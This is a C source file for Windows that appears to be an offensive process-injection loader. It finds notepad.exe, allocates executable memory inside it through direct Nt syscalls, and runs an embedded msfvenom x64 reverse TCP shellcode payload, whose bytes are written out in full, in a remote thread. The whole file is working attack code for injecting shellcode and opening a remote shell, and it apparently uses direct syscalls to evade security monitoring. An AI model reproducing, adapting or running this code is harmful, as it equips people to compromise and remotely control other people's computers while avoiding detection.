#include <stdlib.h>
#include <windows.h>
#include <memoryapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "syscalls.h"
#define TARGET_PROCESS_NAME "notepad.exe"


DWORD find_process(char* process) {

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	//get the list of processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//check processes to find TARGET_PROCESS_NAME
	if (Process32First(snapshot, &process_entry) == TRUE) {

		while (Process32Next(snapshot, &process_entry) == TRUE) {

			if (strcmp(process_entry.szExeFile, process) == 0) {

				CloseHandle(snapshot);
				return process_entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;

}

int main(int argc, char* argv[]) {
	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -b \x00\x0a\x0d -f c
	unsigned char buf[] = 
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x4b\xcb\x3b\x4f\x13\x7e\xae\xf7\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb7\x83\xb8\xab\xe3\x96"
		"\x6e\xf7\x4b\xcb\x7a\x1e\x52\x2e\xfc\xa6\x1d\x83\x0a\x9d\x76"
		"\x36\x25\xa5\x2b\x83\xb0\x1d\x0b\x36\x25\xa5\x6b\x83\xb0\x3d"
		"\x43\x36\xa1\x40\x01\x81\x76\x7e\xda\x36\x9f\x37\xe7\xf7\x5a"
		"\x33\x11\x52\x8e\xb6\x8a\x02\x36\x0e\x12\xbf\x4c\x1a\x19\x8a"
		"\x6a\x07\x98\x2c\x8e\x7c\x09\xf7\x73\x4e\xc3\xf5\x2e\x7f\x4b"
		"\xcb\x3b\x07\x96\xbe\xda\x90\x03\xca\xeb\x1f\x98\x36\xb6\xb3"
		"\xc0\x8b\x1b\x06\x12\xae\x4d\xa1\x03\x34\xf2\x0e\x98\x4a\x26"
		"\xbf\x4a\x1d\x76\x7e\xda\x36\x9f\x37\xe7\x8a\xfa\x86\x1e\x3f"
		"\xaf\x36\x73\x2b\x4e\xbe\x5f\x7d\xe2\xd3\x43\x8e\x02\x9e\x66"
		"\xa6\xf6\xb3\xc0\x8b\x1f\x06\x12\xae\xc8\xb6\xc0\xc7\x73\x0b"
		"\x98\x3e\xb2\xbe\x4a\x1b\x7a\xc4\x17\xf6\xe6\xf6\x9b\x8a\x63"
		"\x0e\x4b\x20\xf7\xad\x0a\x93\x7a\x16\x52\x24\xe6\x74\xa7\xeb"
		"\x7a\x1d\xec\x9e\xf6\xb6\x12\x91\x73\xc4\x01\x97\xf9\x08\xb4"
		"\x34\x66\x06\xad\x09\xdd\xc5\x14\xf8\x09\x4f\x13\x3f\xf8\xbe"
		"\xc2\x2d\x73\xce\xff\xde\xaf\xf7\x4b\x82\xb2\xaa\x5a\xc2\xac"
		"\xf7\x5a\x97\xfb\xe7\x12\x42\xef\xa3\x02\x42\xdf\x03\x9a\x8f"
		"\xef\x4d\x07\xbc\x1d\x48\xec\xab\xe2\x7e\xa1\xa3\x3a\x4e\x13"
		"\x7e\xf7\xb6\xf1\xe2\xbb\x24\x13\x81\x7b\xa7\x1b\x86\x0a\x86"
		"\x5e\x4f\x6e\xbf\xb4\x0b\x73\xc6\xd1\x36\x51\x37\x03\x42\xfa"
		"\x0e\xa9\x94\xa1\x28\xab\x34\xee\x07\x9a\xb9\xc4\xe7\x0a\x93"
		"\x77\xc6\xf1\x36\x27\x0e\x0a\x71\xa2\xea\x67\x1f\x51\x22\x03"
		"\x4a\xff\x0f\x11\x7e\xae\xbe\xf3\xa8\x56\x2b\x13\x7e\xae\xf7"
		"\x4b\x8a\x6b\x0e\x43\x36\x27\x15\x1c\x9c\x6c\x02\x22\xbe\xc4"
		"\xfa\x12\x8a\x6b\xad\xef\x18\x69\xb3\x6f\x9f\x3a\x4e\x5b\xf3"
		"\xea\xd3\x53\x0d\x3b\x27\x5b\xf7\x48\xa1\x1b\x8a\x6b\x0e\x43"
		"\x3f\xfe\xbe\xb4\x0b\x7a\x1f\x5a\x81\x66\xba\xc2\x0a\x77\xc6"
		"\xd2\x3f\x14\x8e\x87\xf4\xbd\xb0\xc6\x36\x9f\x25\x03\x34\xf1"
		"\xc4\x1d\x3f\x14\xff\xcc\xd6\x5b\xb0\xc6\xc5\x5e\x42\xe9\x9d"
		"\x7a\xf5\xb5\xeb\x13\x6a\xb4\x1e\x73\xcc\xd7\x56\x92\xf1\x37"
		"\xc1\xbb\xb4\xf3\x0b\xab\x4c\x0c\xd8\x49\x20\x79\x7e\xf7\xb6"
		"\xc2\x11\xc4\x9a\x13\x7e\xae\xf7";


	HANDLE thread_handle, target_process_handle;
	OBJECT_ATTRIBUTES oa;

	HANDLE remote_thread_handle;
	LPVOID remote_process_buffer = NULL;
	LPVOID buf_pointer = &buf;
	SIZE_T buf_len = sizeof(buf);


	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	//find the process id
	DWORD procid = find_process(TARGET_PROCESS_NAME);
	if (procid == 0) {
		printf("failed to find %s process\n", TARGET_PROCESS_NAME);
		return 1;
	}
	printf("%s process found with process id: %d\n", TARGET_PROCESS_NAME, procid);

	CLIENT_ID ci = { (HANDLE)procid, NULL };

	//open a process handle
	NtOpenProcess(&target_process_handle, PROCESS_ALL_ACCESS, &oa, &ci);

	//allocate a space in the target process
	NtAllocateVirtualMemory(target_process_handle, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	//write the buffer (shellcode) into the space
	NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf_pointer, sizeof(buf), 0);

	//create and run thread in target process
	NtCreateThreadEx(&thread_handle, 0x1FFFFF, NULL, target_process_handle, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);

	//close the handle
	CloseHandle(target_process_handle);

	return 0;
}
